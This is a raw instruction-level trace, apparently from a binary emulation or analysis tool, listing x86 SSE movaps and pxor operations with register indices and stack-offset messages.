adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x430980: movaps xmmword ptr [ebp - 0x110], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x430987: movaps xmm0, xmmword ptr [ebp - 0x110], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 0x4309b2: movaps xmmword ptr [ebp - 0x110], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x4309c5: movaps xmm0, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x4309c9: pxor xmm0, xmmword ptr [ebp - 0x110], regs_read: [122, 20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 0x4309e2: movaps xmm1, xmmword ptr [ebp - 0x130], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 0x4309f2: movaps xmmword ptr [ebp - 0x20], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x4309f6: pxor xmm1, xmm6, regs_read: [123, 128], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430a0b: movaps xmmword ptr [ebp - 0x140], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7ec0 for stack size 0x10000 saving data to stack: 0 16 0x430a12: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430a16: movaps xmm7, xmm0, regs_read: [122], regs_write: [129] 0x430a19: movaps xmmword ptr [ebp - 0x130], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 saving data to stack: 0 16 0x430a24: movaps xmm3, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [125] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x430a31: movaps xmmword ptr [ebp - 0xc0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x430a38: pxor xmm1, xmmword ptr [ebp - 0x40], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 0x430a3d: pxor xmm7, xmm0, regs_read: [129, 122], regs_write: [129] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430a41: movaps xmm4, xmmword ptr [ebp - 0x130], regs_read: [20], regs_write: [126] adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 0x430a48: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x430a4f: movaps xmmword ptr [ebp - 0xb0], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x430a5f: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430a70: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x430a7f: movaps xmm0, xmmword ptr [ebp - 0x110], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 0x430a92: movaps xmmword ptr [ebp - 0x40], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x430a96: movaps xmmword ptr [ebp - 0x110], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x430a9d: pxor xmm4, xmmword ptr [ebp - 0x110], regs_read: [126, 20], regs_write: [126] adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 0x430ab1: movaps xmm0, xmmword ptr [ebp - 0x40], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 0x430ad2: pxor xmm3, xmm6, regs_read: [125, 128], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430ad6: movaps xmmword ptr [ebp - 0x20], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x430adf: movaps xmm3, xmm2, regs_read: [124], regs_write: [125] 0x430aea: movaps xmm4, xmm1, regs_read: [123], regs_write: [126] 0x430af5: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x430af8: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430afc: movaps xmmword ptr [ebp - 0x60], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x430b0e: pxor xmm5, xmm7, regs_read: [127, 129], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430b20: movaps xmmword ptr [ebp - 0x40], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x430b5d: movaps xmmword ptr [ebp - 0x140], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0xc and offset 0x7ec0 for stack size 0x10000 saving data to stack: 0 16 0x430b74: movaps xmmword ptr [ebp - 0x130], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 saving data to stack: 0 16 0x430b7b: movaps xmm0, xmmword ptr [ebp - 0x130], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 0x430b86: movaps xmm1, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x430b93: pxor xmm1, xmmword ptr [ebp - 0x140], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7ec0 for stack size 0x10000 0x430ba4: movaps xmm6, xmmword ptr [ebp - 0x60], regs_read: [20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 0x430ba8: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430bac: movaps xmmword ptr [ebp - 0x130], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 saving data to stack: 0 16 0x430bbc: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x430bbf: movaps xmmword ptr [ebp - 0x20], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x430bc7: movaps xmmword ptr [ebp - 0x60], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x430bcb: movaps xmmword ptr [ebp - 0xb0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x430bd2: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x430bd5: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430bdd: movaps xmm5, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x430be1: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x430bf0: movaps xmm4, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [126] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x430bf4: movaps xmm3, xmm6, regs_read: [128], regs_write: [125] 0x430bff: movaps xmmword ptr [ebp - 0xc0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x430c06: pxor xmm1, xmmword ptr [ebp - 0x40], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 0x430c10: movaps xmm7, xmm1, regs_read: [123], regs_write: [129] 0x430c24: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430c2d: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x430c30: pxor xmm7, xmm1, regs_read: [129, 123], regs_write: [129] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430c42: movaps xmmword ptr [ebp - 0x30], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x430c5e: pxor xmm4, xmm5, regs_read: [126, 127], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430c62: movaps xmm0, xmmword ptr [ebp - 0x30], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x430c8a: pxor xmm3, xmm6, regs_read: [125, 128], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430c8e: movaps xmmword ptr [ebp - 0x10], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x430c9c: movaps xmm3, xmm5, regs_read: [127], regs_write: [125] 0x430ca7: movaps xmmword ptr [ebp - 0x60], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x430cb3: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430cb7: movaps xmmword ptr [ebp - 0x110], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x430cc7: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x430cce: pxor xmm5, xmm7, regs_read: [127, 129], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430cd2: movaps xmmword ptr [ebp - 0x30], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x430cdf: movaps xmm0, xmmword ptr [ebp - 0x70], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 0x430cf4: movaps xmmword ptr [ebp - 0x70], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x430d11: movaps xmm1, xmmword ptr [ebp - 0x110], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 0x430d18: pxor xmm1, xmmword ptr [ebp - 0x70], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 0x430d26: movaps xmm0, xmmword ptr [ebp - 0x60], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 0x430d2a: pxor xmm0, xmm7, regs_read: [122, 129], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430d2e: movaps xmmword ptr [ebp - 0x110], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x430d3e: movaps xmm6, xmm1, regs_read: [123], regs_write: [128] 0x430d41: movaps xmmword ptr [ebp - 0x60], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x430d49: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x430d4c: movaps xmm0, xmm6, regs_read: [128], regs_write: [122] 0x430d4f: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430d57: movaps xmm5, xmmword ptr [ebp - 0x230], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7dd0 for stack size 0x10000 0x430d5e: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x430d6f: movaps xmm1, xmm2, regs_read: [124], regs_write: [123] 0x430d72: pxor xmm1, xmmword ptr [ebp - 0x30], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x430d77: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430d7b: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x430d87: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430d8b: movaps xmm1, xmmword ptr [ebp - 0x60], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 0x430d8f: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x430d9e: movaps xmm0, xmmword ptr [ebp - 0x110], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 0x430da9: movaps xmmword ptr [ebp - 0x230], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7dd0 for stack size 0x10000 saving data to stack: 0 16 0x430db0: movaps xmm5, xmmword ptr [ebp - 0x200], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7e00 for stack size 0x10000 0x430dcb: pxor xmm1, xmmword ptr [ebp - 0x230], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7dd0 for stack size 0x10000 0x430dd3: movaps xmmword ptr [ebp - 0x200], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7e00 for stack size 0x10000 saving data to stack: 0 16 0x430dda: movaps xmm7, xmmword ptr [ebp - 0x200], regs_read: [20], regs_write: [129] adjusting stack for ESP -0xc and offset 0x7e00 for stack size 0x10000 0x430dea: pxor xmm0, xmm7, regs_read: [122, 129], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430dee: movaps xmmword ptr [ebp - 0x200], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0xc and offset 0x7e00 for stack size 0x10000 saving data to stack: 0 16 0x430dfa: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x430e01: movaps xmm1, xmm7, regs_read: [129], regs_write: [123] 0x430e08: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x430e0b: movaps xmm6, xmmword ptr [ebp - 0x1e0], regs_read: [20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7e20 for stack size 0x10000 0x430e12: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430e27: pxor xmm4, xmm1, regs_read: [126, 123], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430e34: movaps xmm3, xmmword ptr [ebp - 0x210], regs_read: [20], regs_write: [125] adjusting stack for ESP -0xc and offset 0x7df0 for stack size 0x10000 0x430e47: pxor xmm5, xmm6, regs_read: [127, 128], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430e58: movaps xmmword ptr [ebp - 0xc0], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x430e5f: pxor xmm7, xmm3, regs_read: [129, 125], regs_write: [129] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430e63: movaps xmmword ptr [ebp - 0xb0], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x430e77: movaps xmmword ptr [ebp - 0x210], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7df0 for stack size 0x10000 saving data to stack: 0 16 0x430e7e: movaps xmm4, xmm7, regs_read: [129], regs_write: [126] 0x430e81: movaps xmmword ptr [ebp - 0x1e0], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7e20 for stack size 0x10000 saving data to stack: 0 16 0x430e88: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x430e8f: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430e93: movaps xmm1, xmm4, regs_read: [126], regs_write: [123] 0x430e96: pxor xmm1, xmmword ptr [ebp - 0xc0], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 0x430e9e: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x430ea5: movaps xmm3, xmm1, regs_read: [123], regs_write: [125] 0x430eb1: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430eb5: movaps xmm6, xmm2, regs_read: [124], regs_write: [128] 0x430ebd: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x430ec0: pxor xmm3, xmm1, regs_read: [125, 123], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430ec4: movaps xmm1, xmmword ptr [ebp - 0xb0], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 0x430ed7: movaps xmm2, xmmword ptr [ebp - 0x240], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7dc0 for stack size 0x10000 0x430ef0: movaps xmmword ptr [ebp - 0x240], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7dc0 for stack size 0x10000 saving data to stack: 0 16 0x430ef7: movaps xmm2, xmmword ptr [ebp - 0x250], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7db0 for stack size 0x10000 0x430f10: pxor xmm1, xmmword ptr [ebp - 0x240], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7dc0 for stack size 0x10000 0x430f18: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430f26: movaps xmmword ptr [ebp - 0x250], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7db0 for stack size 0x10000 saving data to stack: 0 16 0x430f2d: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x430f34: movaps xmmword ptr [ebp - 0x1e0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7e20 for stack size 0x10000 saving data to stack: 0 16 0x430f3b: movaps xmm4, xmmword ptr [ebp - 0x1a0], regs_read: [20], regs_write: [126] adjusting stack for ESP -0xc and offset 0x7e60 for stack size 0x10000 0x430f42: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x430f4d: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430f5a: movaps xmm3, xmmword ptr [ebp - 0x1e0], regs_read: [20], regs_write: [125] adjusting stack for ESP -0xc and offset 0x7e20 for stack size 0x10000 0x430f61: movaps xmm1, xmm7, regs_read: [129], regs_write: [123] 0x430f68: movaps xmm5, xmmword ptr [ebp - 0x190], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7e70 for stack size 0x10000 0x430f77: pxor xmm6, xmm1, regs_read: [128, 123], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430f88: pxor xmm3, xmm5, regs_read: [125, 127], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430f8c: movaps xmmword ptr [ebp - 0x190], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7e70 for stack size 0x10000 saving data to stack: 0 16 0x430fa0: pxor xmm7, xmm4, regs_read: [129, 126], regs_write: [129] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430fa4: movaps xmmword ptr [ebp - 0x1e0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7e20 for stack size 0x10000 saving data to stack: 0 16 0x430fb4: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x430fb7: movaps xmmword ptr [ebp - 0x1a0], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7e60 for stack size 0x10000 saving data to stack: 0 16 0x430fc2: movaps xmm4, xmm7, regs_read: [129], regs_write: [126] 0x430fc5: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x430fcc: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430fd0: movaps xmm1, xmm4, regs_read: [126], regs_write: [123] 0x430fd3: movaps xmm2, xmmword ptr [ebp - 0x190], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7e70 for stack size 0x10000 0x430fda: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x430fee: pxor xmm1, xmm6, regs_read: [123, 128], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430ff2: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430ff6: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x431002: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x431006: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x431015: movaps xmm0, xmmword ptr [ebp - 0x1e0], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7e20 for stack size 0x10000 0x431020: movaps xmmword ptr [ebp - 0x190], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7e70 for stack size 0x10000 saving data to stack: 0 16 0x431027: movaps xmm2, xmmword ptr [ebp - 0x220], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7de0 for stack size 0x10000 0x43104a: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x43104e: pxor xmm7, xmmword ptr [ebp - 0x190], regs_read: [129, 20], regs_write: [129] adjusting stack for ESP -0xc and offset 0x7e70 for stack size 0x10000 0x431060: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x431063: movaps xmmword ptr [ebp - 0x220], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7de0 for stack size 0x10000 saving data to stack: 0 16 0x43106a: movaps xmmword ptr [ebp - 0x1a0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7e60 for stack size 0x10000 saving data to stack: 0 16 0x431075: movaps xmm1, xmm7, regs_read: [129], regs_write: [123] 0x431078: movaps xmm4, xmmword ptr [ebp - 0x1c0], regs_read: [20], regs_write: [126] adjusting stack for ESP -0xc and offset 0x7e40 for stack size 0x10000 0x43108b: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x43108e: movaps xmm5, xmmword ptr [ebp - 0x190], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7e70 for stack size 0x10000 0x431095: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4310aa: pxor xmm6, xmm1, regs_read: [128, 123], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4310b7: movaps xmm3, xmmword ptr [ebp - 0x1a0], regs_read: [20], regs_write: [125] adjusting stack for ESP -0xc and offset 0x7e60 for stack size 0x10000 0x4310c6: movaps xmmword ptr [ebp - 0x190], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7e70 for stack size 0x10000 saving data to stack: 0 16 0x4310cd: pxor xmm3, xmm5, regs_read: [125, 127], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4310d1: movaps xmmword ptr [ebp - 0x1c0], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7e40 for stack size 0x10000 saving data to stack: 0 16 0x4310e1: pxor xmm7, xmm4, regs_read: [129, 126], regs_write: [129] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4310ee: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x4310f1: movaps xmmword ptr [ebp - 0x1a0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7e60 for stack size 0x10000 saving data to stack: 0 16 0x4310fc: movaps xmm3, xmm7, regs_read: [129], regs_write: [125] 0x431103: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x431106: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x43110a: movaps xmm1, xmm3, regs_read: [125], regs_write: [123] 0x43110d: pxor xmm1, xmm6, regs_read: [123, 128], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x431111: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x431118: movaps xmm4, xmm1, regs_read: [123], regs_write: [126] 0x431129: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x43112d: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x431130: pxor xmm4, xmm1, regs_read: [126, 123], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x431134: movaps xmm6, xmm2, regs_read: [124], regs_write: [128] 0x431137: movaps xmm1, xmmword ptr [ebp - 0x1a0], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7e60 for stack size 0x10000 0x43114a: movaps xmm2, xmmword ptr [ebp - 0x150], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7eb0 for stack size 0x10000 0x431163: movaps xmmword ptr [ebp - 0x150], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7eb0 for stack size 0x10000 saving data to stack: 0 16 0x43116a: movaps xmm2, xmmword ptr [ebp - 0x160], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7ea0 for stack size 0x10000 0x431183: pxor xmm1, xmmword ptr [ebp - 0x150], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7eb0 for stack size 0x10000 0x43118b: movaps xmmword ptr [ebp - 0x160], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7ea0 for stack size 0x10000 saving data to stack: 0 16 0x431192: pxor xmm0, xmmword ptr [ebp - 0x160], regs_read: [122, 20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7ea0 for stack size 0x10000 0x4311a4: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x4311ab: movaps xmm1, xmm7, regs_read: [129], regs_write: [123] 0x4311ae: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x4311b5: movaps xmm5, xmmword ptr [ebp - 0x170], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7e90 for stack size 0x10000 0x4311bc: pxor xmm3, xmm4, regs_read: [125, 126], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4311d1: pxor xmm6, xmm1, regs_read: [128, 123], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4311de: movaps xmm4, xmmword ptr [ebp - 0x180], regs_read: [20], regs_write: [126] adjusting stack for ESP -0xc and offset 0x7e80 for stack size 0x10000 0x4311f1: pxor xmm2, xmm5, regs_read: [124, 127], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x431202: movaps xmmword ptr [ebp - 0x170], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7e90 for stack size 0x10000 saving data to stack: 0 16 0x431209: pxor xmm7, xmm4, regs_read: [129, 126], regs_write: [129] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x43120d: movaps xmmword ptr [ebp - 0x180], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7e80 for stack size 0x10000 saving data to stack: 0 16 0x43121d: movaps xmm4, xmm2, regs_read: [124], regs_write: [126] 0x431220: movaps xmmword ptr [ebp - 0xc0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x43122b: mov eax, dword ptr [ebx + 8], regs_read: [21], regs_write: [19] 0x43122e: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x431231: pxor xmm4, xmmword ptr [ebp - 0x180], regs_read: [126, 20], regs_write: [126] adjusting stack for ESP -0xc and offset 0x7e80 for stack size 0x10000 